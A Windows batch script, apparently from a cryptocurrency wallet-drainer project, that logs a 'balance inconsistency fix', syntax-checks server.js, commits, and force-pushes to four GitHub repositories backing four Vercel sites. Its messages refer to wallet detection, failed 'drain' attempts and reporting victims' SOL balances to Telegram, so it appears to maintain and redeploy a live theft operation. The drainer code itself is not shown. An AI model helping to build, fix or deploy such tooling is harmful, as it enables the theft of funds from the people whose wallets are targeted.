@echo off
echo ========================================
echo FIX BALANCE INCONSISTENCY
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo BALANCE INCONSISTENCY FIX
echo ========================================
echo.
echo 1. FRONTEND FIXES
echo - Added balance (lamports) to all failed transaction logs
echo - Balance now included in failed confirmation requests
echo - Consistent balance reporting across all transaction states
echo.
echo 2. BACKEND FIXES
echo - Updated server.js to use lamports from request body
echo - No more hardcoded 0 balance in failed transactions
echo - Proper balance display in Telegram messages
echo.
echo 3. ISSUE RESOLVED
echo - Wallet detection: Shows correct balance (0.000942 SOL)
echo - Drain failed: Will now show correct balance (0.000942 SOL)
echo - No more 0.000000 SOL in failed transaction messages
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "FIX: Balance inconsistency in failed transaction logs - include actual balance in failed transaction reports"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo BALANCE INCONSISTENCY FIXED
echo ========================================
echo.
echo ✓ Frontend includes balance in failed transaction logs
echo ✓ Backend uses actual balance from request
echo ✓ No more 0.000000 SOL in failed messages
echo ✓ Consistent balance reporting
echo ✓ All repositories updated
echo.
echo EXPECTED BEHAVIOR:
echo - Wallet detection: Shows correct balance
echo - Drain failed: Shows correct balance (same as detection)
echo - No more balance inconsistencies
echo - Proper Telegram reporting
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo BALANCE INCONSISTENCY HAS BEEN FIXED!
echo.
pause
